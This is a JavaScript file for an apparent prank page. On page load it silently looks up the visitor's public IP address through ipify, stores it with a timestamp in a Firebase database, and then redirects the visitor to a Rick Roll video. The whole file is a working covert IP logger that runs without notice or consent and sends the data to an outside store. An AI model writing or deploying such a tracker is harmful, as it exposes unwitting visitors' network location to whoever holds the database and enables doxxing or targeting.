import { database } from './firebase.js';
import { ref, push } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";


const RICK_ROLL = 'https://www.youtube.com/watch?v=xvFZjo5PgG0';

async function getRealIP() {
    try {
        const response = await fetch('https://api.ipify.org/?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        throw new Error('Failed to fetch IP address: ' + error);
    }
}

async function submitIpToFirebase() {

    try {
        const ip = await getRealIP();
        const ipsRef = ref(database, 'ips');

        // Push the IP address to Firebase
        push(ipsRef, {
            ip: ip,
            timestamp: new Date().toISOString()
        });
    }
    catch (error) {
        throw new Error('Failed to fetch IP address: ' + error);
    }
    setTimeout(() => window.open(RICK_ROLL, '_self'), 3000);
}

window.addEventListener("load", submitIpToFirebase);